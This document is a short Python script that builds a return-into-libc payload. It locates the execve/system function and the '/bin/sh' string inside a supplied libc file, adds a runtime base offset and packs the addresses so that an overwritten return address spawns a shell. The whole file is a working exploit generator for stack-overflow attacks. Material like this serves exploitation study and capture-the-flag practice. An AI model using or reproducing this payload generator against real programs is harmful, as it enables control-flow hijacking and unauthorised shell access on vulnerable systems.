#!/usr/bin/env python3
# -!- encoding:utf8 -!-
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#    file: gen_ril_payload.py
#    date: 2017-08-06
#  author: paul.dautry
# purpose:
#       Generate a RIL payload based on input libc6 file and runtime lib offset 
#
#   +------------+
#   |   &system  | (or execve)
#   +------------+
#   |    AAAA    |
#   +------------+
#   | &"/bin/sh" |
#   +------------+
#
#
#
#
#
# license:
#       GPLv3
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# IMPORTS
#-------------------------------------------------------------------------------
import sys
import struct
from subprocess import check_output
#-------------------------------------------------------------------------------
# FUNCTIONS
#-------------------------------------------------------------------------------
def get_func_offset(function, libc_fpath):
    pat = '<%s' % function
    dump = check_output(['objdump', '-d', libc_fpath]).decode('utf-8')
    for l in dump.split('\n'):
        if len(l) > 0:
            if pat in l:
                parts = l.split(' ')
                if len(parts) == 2:
                    oft = int(parts[0], 16)
                    print('> function found: %s => %s offset: %#010x' % (l, function, oft))
                    return oft
    print('error: could not find function in objdump output.')
    exit(1)

def get_bin_sh_offset(libc_fpath):
    pat = b'/bin/sh'
    with open(libc_fpath, 'rb') as f:
        data = f.read()
    for k in range(0, len(data)):
        if data[k:k+len(pat)] == pat:
            print('> found "%s" in lib at offset %#010x' % (pat.decode('utf-8'), k))
            return k
    print('error: could not find "%s" string in lib.' % (pat.decode('utf-8')))
    exit(1)

def generate_payload(function, libc_fpath, libc_rt_oft):
    func_oft = get_func_offset(function, libc_fpath)
    bin_sh_oft = get_bin_sh_offset(libc_fpath)
    pld = b''
    pld += struct.pack('<I', libc_rt_oft+func_oft)
    pld += b'A' * 4
    pld += struct.pack('<I', libc_rt_oft+bin_sh_oft)
    pld += b'\x00' * 4
    pld += b'\x00' * 4
    return pld

def main():
    if len(sys.argv) != 3:
        print('usage: %s <libc_fpath> <libc_rt_oft>' % sys.argv[0])
        print('example: %s libc6.so 0x07000000' % sys.argv[0])
        exit(1)
    libc_fpath = sys.argv[1]
    libc_rt_oft = int(sys.argv[2], 16)
    pld = generate_payload('execve', libc_fpath, libc_rt_oft)
    print('> payload:\t%s' % pld)
    print('> first 4 bytes of payload must be written on ret addr.')
    if b'\x00' in pld:
        print('WARNING: payload contains null bytes.')

#-------------------------------------------------------------------------------
# SCRIPT
#-------------------------------------------------------------------------------
if __name__ == '__main__':
    main()